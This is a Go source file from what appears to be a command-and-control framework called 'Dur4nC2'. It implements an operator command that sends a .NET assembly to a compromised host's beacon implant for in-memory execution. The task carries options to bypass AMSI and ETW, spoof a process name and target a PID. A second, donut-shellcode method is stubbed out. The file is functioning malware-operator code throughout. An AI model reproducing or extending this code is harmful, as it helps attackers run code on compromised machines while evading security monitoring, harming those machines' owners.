package exec

import (
	"Dur4nC2/misc/protobuf/clientpb"
	"Dur4nC2/misc/protobuf/commonpb"
	"Dur4nC2/misc/protobuf/implantpb"
	"Dur4nC2/server/console"
	"Dur4nC2/server/db"
	beaconRepository "Dur4nC2/server/domain/beacon/repository/postgres"
	"Dur4nC2/server/domain/models"
	taskRepository "Dur4nC2/server/domain/task/repository/postgres"
	"errors"
	"github.com/desertbit/grumble"
	"github.com/gofrs/uuid"
	"google.golang.org/protobuf/proto"
	"io/ioutil"
	"math/rand"
	"strings"
)

func ExecuteAssemblyCmd(ctx *grumble.Context, con *console.ServerConsoleClient) error {
	beacon := con.ActiveTarget.GetBeacon()
	if beacon == nil {
		return errors.New("non active beacon")
	}
	filePath := ctx.Flags.String("file-path")
	amsi := ctx.Flags.Bool("amsi")
	etw := ctx.Flags.Bool("etw")
	isDll := ctx.Flags.Bool("is-dll")
	runtime := ctx.Flags.String("runtime-version")
	arch := ctx.Flags.String("arch")
	classname := ctx.Flags.String("classname")
	appDomain := ctx.Flags.String("app-domain")
	method := ctx.Flags.String("execution-method")
	args := ctx.Args.StringList("arguments")
	description := ctx.Flags.String("description")
	processName := ctx.Flags.String("spoofed-process-name")
	pid := ctx.Flags.String("pid")
	programPath := ctx.Flags.String("program-path")
	assemblyArgsStr := strings.Join(args, " ")
	assemblyArgsStr = strings.TrimSpace(assemblyArgsStr)

	beaconRepo := beaconRepository.NewPostgresBeaconRepository(db.Session())
	currentBeacon, err := beaconRepo.Read(uuid.FromStringOrNil(beacon.ID))
	if err != nil {
		return err
	}
	assembly, err := ioutil.ReadFile(filePath)
	//fmt.Println(dllData)
	if err != nil {
		return err
	}

	switch method {
	case "goCLR":
		err = executeAssemblyGoCLR(con, beacon, currentBeacon, assembly, args, amsi, etw, runtime, description)
		break
	case "donut":
		err = executeAssemblyDonut(con, beacon, currentBeacon, filePath, assembly, isDll, arch, assemblyArgsStr, method, runtime, classname, appDomain, description, processName, programPath, pid)
		break
	default:
		break
	}
	return err
}

func executeAssemblyGoCLR(
	con *console.ServerConsoleClient,
	beacon *clientpb.Beacon,
	currentBeacon models.Beacon,
	assembly []byte,
	args []string,
	amsi bool,
	etw bool,
	runtime string,
	description string,
) error {
	request := &commonpb.Request{BeaconID: beacon.ID}
	executeAssemblyReq := &implantpb.ExecuteAssemblyReq{
		Assembly:     assembly,
		AssemblyArgs: args,
		AmsiBypass:   amsi,
		EtwBypass:    etw,
		Runtime:      runtime,
		Request:      request,
	}
	data, _ := proto.Marshal(executeAssemblyReq)
	taskReq := &implantpb.Envelope{
		ID:   1,
		Type: implantpb.MsgExecuteAssemblyReq,
		Data: data,
	}
	taskReqData, _ := proto.Marshal(taskReq)

	v := rand.Intn(999999999999999999-100000000000000000) + 100000000000000000
	newTask := models.BeaconTask{
		EnvelopeID:  int64(v),
		BeaconID:    uuid.FromStringOrNil(beacon.ID),
		Description: description,
		State:       models.PENDING,
		Request:     taskReqData,
	}
	taskRepo := taskRepository.NewPostgresBeaconTaskRepository(db.Session())
	err := taskRepo.Create(currentBeacon, newTask)
	if err != nil {
		return err
	}
	con.PrintInfof("Task successfully added to the queue, please wait the response...")

	return nil
}

func executeAssemblyDonut(
	con *console.ServerConsoleClient,
	beacon *clientpb.Beacon,
	currentBeacon models.Beacon,
	path string,
	assembly []byte,
	isDLL bool,
	arch string,
	params string,
	method string,
	runtime string,
	className string,
	appDomain string,
	description string,
	processName string,
	programPath string,
	pid string,
) error {
	/*
		shellcode, err := generate.CDonutShellcodeFromPath(path)
		if err != nil {
			return err
		}
		return executeShellcode(con, shellcode, beacon, currentBeacon, processName, programPath, pid, description, "sacrificial")

	*/
	return errors.New("non implemented")
}
